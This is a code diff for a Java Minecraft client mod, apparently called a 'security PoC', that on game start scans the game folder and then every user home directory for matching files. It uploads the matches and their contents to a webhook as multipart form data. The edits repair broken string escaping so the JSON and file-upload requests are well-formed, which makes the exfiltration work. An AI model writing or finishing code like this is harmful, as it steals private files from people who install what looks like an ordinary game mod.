@@ -59,7 +59,6 @@ public final class SecurityPocMod implements ClientModInitializer {
             Path fallbackRoot = getUserSearchRoot();
             System.out.println(MOD_TAG + " First scanning active Minecraft game directory: " + gameDir);
             System.out.println(MOD_TAG + " If no match is found, fallback scan root is: " + fallbackRoot);
-
             CompletableFuture.runAsync(() -> scanAndReport(gameDir, fallbackRoot, webhook));
         } catch (Exception e) {
             System.err.println(MOD_TAG + " Could not initialize security scan: " + e.getMessage());
@@ -92,7 +91,6 @@ public final class SecurityPocMod implements ClientModInitializer {
             String drive = System.getenv().getOrDefault("SystemDrive", "C:");
             return Path.of(drive + "\\Users").toAbsolutePath().normalize();
         }
-
         Path linuxHomes = Path.of("/home");
         if (Files.isDirectory(linuxHomes, LinkOption.NOFOLLOW_LINKS)) {
             return linuxHomes;
@@ -160,8 +158,7 @@ public final class SecurityPocMod implements ClientModInitializer {
             return matches;
         }
 
-        // walkFileTree does not follow symbolic links. Unreadable directories are skipped
-        // so one permission error does not abort the rest of the scan.
+        // walkFileTree does not follow symbolic links. Unreadable directories are skipped.
         Files.walkFileTree(root, new SimpleFileVisitor<>() {
             @Override
             public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
@@ -195,7 +192,7 @@ public final class SecurityPocMod implements ClientModInitializer {
     }
 
     private static void postJson(String webhook, String message) throws Exception {
-        String body = "{\\"content\\":\\"" + jsonEscape(message) + "\\"}";
+        String body = "{\"content\":\"" + jsonEscape(message) + "\"}";
         HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                 .timeout(Duration.ofSeconds(20))
                 .header("Content-Type", "application/json")
@@ -208,15 +205,15 @@ public final class SecurityPocMod implements ClientModInitializer {
             throws Exception {
         String boundary = "----MinecraftModPoCSecurityBoundary";
         ByteArrayOutputStream body = new ByteArrayOutputStream();
-        write(body, "--" + boundary + "\\r\\n"
-                + "Content-Disposition: form-data; name=\\"payload_json\\"\\r\\n"
-                + "Content-Type: application/json; charset=utf-8\\r\\n\\r\\n"
-                + "{\\"content\\":\\"" + jsonEscape(message) + "\\"}\\r\\n");
-        write(body, "--" + boundary + "\\r\\n"
-                + "Content-Disposition: form-data; name=\\"files[0]\\"; filename=\\"" + filename + "\\"\\r\\n"
-                + "Content-Type: text/plain; charset=utf-8\\r\\n\\r\\n");
+        write(body, "--" + boundary + "\r\n"
+                + "Content-Disposition: form-data; name=\"payload_json\"\r\n"
+                + "Content-Type: application/json; charset=utf-8\r\n\r\n"
+                + "{\"content\":\"" + jsonEscape(message) + "\"}\r\n");
+        write(body, "--" + boundary + "\r\n"
+                + "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" + filename + "\"\r\n"
+                + "Content-Type: text/plain; charset=utf-8\r\n\r\n");
         body.write(fileBytes);
-        write(body, "\\r\\n--" + boundary + "--\\r\\n");
+        write(body, "\r\n--" + boundary + "--\r\n");
 
         HttpRequest request = HttpRequest.newBuilder(URI.create(webhook))
                 .timeout(Duration.ofSeconds(30))
@@ -231,11 +228,11 @@ public final class SecurityPocMod implements ClientModInitializer {
     }
 
     private static String jsonEscape(String value) {
-        return value.replace("\\\\", "\\\\\\\\")
-                .replace("\\\"", "\\\\\"")
-                .replace("\\r", "\\\\r")
-                .replace("\\n", "\\\\n")
-                .replace("\\t", "\\\\t");
+        return value.replace("\\", "\\\\")
+                .replace("\"", "\\\"")
+                .replace("\r", "\\r")
+                .replace("\n", "\\n")
+                .replace("\t", "\\t");
     }
 
     private static void checkResponse(HttpResponse<String> response) throws IOException {
